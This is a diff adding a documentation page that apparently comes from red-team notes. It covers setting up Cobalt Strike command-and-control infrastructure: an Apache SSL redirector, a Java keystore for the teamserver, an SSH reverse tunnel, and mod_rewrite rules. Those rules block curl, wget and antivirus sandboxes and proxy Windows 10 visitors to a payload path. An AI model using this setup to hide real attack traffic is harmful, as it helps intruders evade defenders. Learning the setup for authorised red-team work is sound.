@@ -1,0 +1,184 @@
+import Image from 'next/image'
+import { Callout } from 'nextra-theme-docs'
+
+### C2 Infrastructure
+![c2_infra](/images/c2_infra.png)
+<Callout type="info" emoji="ℹ️">
+  The traffic between the **redirector** and the **teamserver** can be in either HTTP or HTTPS. and It can be off-loaded on the **redirector** and let the traffic between the **redirector** and the **teamserver** in plain HTTP as It will be already tunneled inside **SSH**
+</Callout>
+
+
+### C2 Setup
+#### Install Apache HTTP server and enable SSL on the **redirector** machine 
+- Installing Apache HTTP server and enabling SSL
+``` bash copy
+
+# Apache Installation
+sudo apt install apache2
+sudo a2enmod ssl rewrite proxy proxy_http
+
+# Configuring SSL on Apache
+## There is a built-in conf file for the HTTPS, we just need to enable it
+## The enabled configurations are just a soft link to the `/etc/apache2/sites-enabled` directory
+## We just need to remove the current soft link
+sudo rm 000-default.conf
+
+## Create a new soft link to the SSL configuration file
+sudo ln -s ../sites-available/default-ssl.conf .
+
+## Restart Apache
+sudo systemctl restart apache2
+```
+
+- Generate SSL certificate
+```bash copy
+# Generate a new key-pair on the teamserver and copy them to the redirector server
+openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out public.crt -keyout private.key
+
+# Update those 2 lines in  /etc/apache2/sites-enabled/default-ssl.conf after copying them to the corresponding directory
+SSLCertificateFile      /etc/ssl/certs/public.crt
+SSLCertificateKeyFile /etc/ssl/private/private.key
+
+```
+<Callout type="info" emoji="ℹ️">
+  We can just use the **public.crt** and **private.key** without getting them signed by a public CA, but have to configure the apache server to ignore the self-signed certificate
+  by adding this line to the apache configuration file `SSLProxyCheckPeerCN off`. This is required to tell Apache to ignore that the SSL certificate on Cobalt Strike's HTTPS listener is self-signed.
+</Callout>
+<Callout type="info" emoji="ℹ️">
+  To sign the certificate with from a public CA we can use **certbot** and **letsencrypt**
+</Callout>
+
+
+#### Configure SSL on the Team server
+Because the CobaltStrike's teamserver is written in java, we'll have to import the private key and the public certificate into a java keystore.
+<Callout type="info" emoji="ℹ️">
+  We'll use the same private key and certificate generated on the **redirector** machine.
+</Callout>
+  1. Import the private key and the certificate into a **pkcs12** file
+      ```bash copy
+      openssl pkcs12 -inkey private.key -in public.crt -export -out acme.pkcs12
+      ```
+  2. Import the `pkcs12` file into a java keystore
+     ```bash copy
+     keytool -importkeystore -srckeystore acme.pkcs12 -srcstoretype pkcs12 -destkeystore acme.store
+     ```
+  3. Reference the java keystore in the C2 malleable profile
+     ```JSON copy
+     https-certificate {
+     set keystore "tig00r.store";
+     set password "password";
+      }
+     ```
+     <Callout type="info" emoji="ℹ️">
+      The java keystore must be in the same directory as the C2 server
+     </Callout>  
+  4. Launch the teamserver
+      ```bash copy
+      sudo ./teamserver 10.10.0.69 'P@ssw0rd' c2-profiles/normal/webbug_getonly.profile
+     ```
+#### Configure the SSH tunnel between the **redirector** and the **teamserver**
+  5. Port Forward the **443** port of **the teamserver** ( the listener ) to the **redirector** machine. 
+      This can be done in 2 ways:
+      - **Using traditional SSH port forwarding**:
+        ```bash copy
+        # On the teamserver
+        ssh -N -R 8443:localhost:443 -i ssh-user ssh-user@redirector
+        ```
+        <Callout type="info" emoji="ℹ️">
+        **Where**
+        - `-N`   Stops the session from dropping in to a shell.
+        - `8443` HTTPS port on redirector machine.
+        - `443`  HTTPS port on team server.
+        </Callout>
+        Now, whoever connects to port `8443` on the **redirector** machine, his traffic will be redirected to port `443` on the **teamserver**
+
+      - **Using [autossh](https://linux.die.net/man/1/autossh)**
+      
+        Add the following content to the `~/.ssh/config` file on the **redirector** machine
+        ```text copy
+        Host                 redirector-1
+        HostName             10.10.5.39
+        User                 ssh-user
+        Port                 22
+        IdentityFile         /home/ubuntu/ssh-user
+        RemoteForward        8443 localhost:443
+        ServerAliveInterval  30
+        ServerAliveCountMax  3
+        ```
+        Now, start the port forwarding from the **teamserver**
+        ```bash copy
+        autossh -M 0 -f -N redirector-1
+        ```
+        <Callout type="info" emoji="ℹ️">
+        **Where**
+        - `-M 0`  disables the autossh monitoring port (in favour of OpenSSH's built-in ServerAliveInterval and ServerAliveCountMax capabilities).
+        - `-f` tells autossh to run in the background.
+        </Callout>
+
+
+#### Traffic Proxying within the redirector
+By looking at the following diagram, we already configured everything, except the traffic redirection within the redirectror server, which can be done through `.htaccess` file
+![c2_infra](/images/c2-infra.png)
+- Under `/etc/apache2/sites-enabled/default-ssl.conf` add the following tag before the `</VirtualHost>` closing tag
+```xml copy
+<Directory /var/www/html/>
+  Options Indexes FollowSymLinks MultiViews
+  AllowOverride All
+  Require all granted
+</Directory>  
+```
+- Allow **SSL Proxying** by adding  `SSLProxyEngine on` under `SSLEngine on`
+- Restart the Apache server 
+  ```bash copy
+    sudo systemctl restart apache2
+  ```
+- Configure `.htaccess`
+  create `.htaccess` file under `/var/www/html` and add the following lines to it
+  ```text copy
+  RewriteEngine on
+  RewriteRule ^test$ index.html [NC]
+  ```
+   
+  <Callout type="info" emoji="ℹ️">
+    **RewriteRule**: 
+
+    Example: `RewriteRule <Regx> <epattern> <substitution> [flags]`
+  </Callout>
+  <Callout type="info" emoji="ℹ️">
+    **Some useful flags**
+    - `[L]` (Last)  Tells mod_rewrite to stop processing further rules.
+    - `[NE]` (No Escape).  Don't encode special characters (e.g. & and ?) to their hex values.
+    - `[P]` (Proxy)  Handle the request with mod_proxy.
+    - `[R]` (Redirect)  Send a redirect code in response.
+    - `[S]` (Skip)  Skip the next N number of rules.
+    - `[T]` (Type)  Sets the MIME type of the response.
+    - Example:  `[L, NE, P]`
+  </Callout>
+  <Callout type="info" emoji="ℹ️">
+    **RewriteCond**:
+     
+    - When combined with **RewriteRule** allows  rewrite rules to only be applied under certain conditions
+    - We can use multiple conditions for the same rule, and they'll be evaluated from top to bottom
+    - Example: `TestString Condition [Flags]`
+    - Refer to [mod_rewrite](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html) for  more options
+  </Callout> 
+##### Redirection Rules
+###### User Agent Rules
+- Can be sued to block script-style agents ex: **curl**, **wget**, **powershell**, **python**, **Known AV Scanners and Sandboxes**, ... 
+- Example: Blocking **curl** and **wget** by returning `403` if the request contained one of them in the `User-Agent` reqeust header
+  ```json copy
+  RewriteEngine on
+
+  RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
+  RewriteRule .* - [F]
+  ```
+- Example: Allowing only **Windows 10 devices**
+  ```json copy
+  RewriteCond %{HTTP_USER_AGENT} "Windows NT 10.0" [NC]
+  RewriteRule .* https://localhost:8443/win-payload [P]
+  ```
+  <Callout type="info" emoji="ℹ️">
+    The `[P]` or Proxy directive is special because it proxies the request to our backend server in a way that's transparent to the requesting party.
+  </Callout>
+###### Cookie Rules
+###### URI Rules 
